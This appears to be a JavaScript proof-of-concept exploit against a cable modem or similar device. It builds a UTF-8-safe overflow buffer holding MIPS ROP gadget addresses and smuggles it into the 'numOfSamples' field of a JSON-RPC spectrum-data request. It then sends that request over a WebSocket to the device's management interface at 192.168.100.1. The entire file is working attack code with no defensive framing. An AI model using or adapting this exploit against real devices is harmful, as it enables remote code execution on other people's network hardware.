function buf2hex(buffer) { // buffer is an ArrayBuffer
    return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

function insertAt(arr, index, toInsert) {
    for(let i = 0; i < toInsert.length; i++) {
        arr[i+index]= toInsert[i];
    }
}

function testEqual(buf1, buf2)
{
    if (buf1.byteLength != buf2.byteLength) return false;
    var dv1 = new Int8Array(buf1);
    var dv2 = new Int8Array(buf2);
    for (var i = 0 ; i != buf1.byteLength ; i++)
    {
        if (dv1[i] != dv2[i]) return false;
    }
    return true;
}

arr = new Uint8Array(0x500);

arr.fill(0x41)

firstSp = 0x00
previousSp = firstSp
sp = previousSp+0xa0
insertAt(arr, previousSp+0x94-1, [0xc2, 0x80, 0xce, 0x84, 0x74]) 
// 0x80ce8474: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

previousSp = sp
sp = previousSp+0x10
insertAt(arr, previousSp-1, [0xf2, 0x80, 0x9e, 0x8e, 0xf0, 0x90, 0x80, 0x81]) 
//0x809e8ef0: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;



var string = new TextDecoder("utf-8").decode(arr);

var newArr = new TextEncoder("utf-8").encode(string);

console.log(buf2hex(newArr));

exploit = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":0,"fStopHz":1000000000,"fftSize":1024,"gain":1,"numOfSamples":' + string + '},"id":"0"}'
console.log(exploit)

console.log(testEqual(arr, newArr));

socket = new WebSocket("ws://192.168.100.1:8080/Frontend", 'rpc-frontend');

socket.onopen = function(e) {
    socket.send(exploit)
};